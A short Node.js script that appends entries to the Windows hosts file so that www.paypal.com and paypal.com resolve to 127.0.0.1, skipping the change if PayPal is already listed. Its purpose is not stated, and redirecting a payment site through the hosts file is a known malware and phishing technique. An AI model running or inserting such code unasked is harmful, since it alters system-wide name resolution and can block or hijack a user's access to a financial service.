import fs from 'node:fs'

const dnspath = 'c:/windows/system32/drivers/etc/hosts'

const filedata = fs.readFileSync(dnspath).toString()

if (filedata.includes('www.paypal.com')) {
  console.log('Exists')
  process.exit()
}

fs.appendFileSync(dnspath, '\n127.0.0.1 www.paypal.com\n127.0.0.1 paypal.com')

console.log('Success')
